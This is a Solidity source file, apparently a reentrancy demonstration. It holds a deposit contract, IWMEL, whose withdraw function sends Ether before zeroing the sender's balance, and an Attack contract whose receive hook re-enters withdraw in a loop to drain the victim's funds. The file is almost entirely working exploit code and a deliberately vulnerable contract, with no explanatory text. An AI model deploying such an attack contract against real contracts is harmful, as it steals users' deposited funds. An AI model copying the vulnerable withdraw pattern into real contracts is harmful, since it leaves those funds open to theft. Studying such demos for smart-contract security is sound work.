contract IWMEL
{
    mapping(address => uint) public balances;

    constructor () payable {}

    function deposit() external payable 
    {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public 
    {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) 
    {
        return address(this).balance;
    }
}

contract Attack 
{
    IWMEL public wmel;

    constructor(address _wmelAddress) 
    {
        wmel = IWMEL(_wmelAddress);
    }

    // receive is called when wmel sends Ether to this contract. (> 0.8.x)
    receive() external payable 
    {
        if (address(wmel).balance >= 1 ether) 
        {
            wmel.withdraw();
        }
    }

    function attack() external payable 
    {
        require(msg.value >= 1 ether);
        wmel.deposit{value: 1 ether}();
        wmel.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) 
    {
        return address(this).balance;
    }
}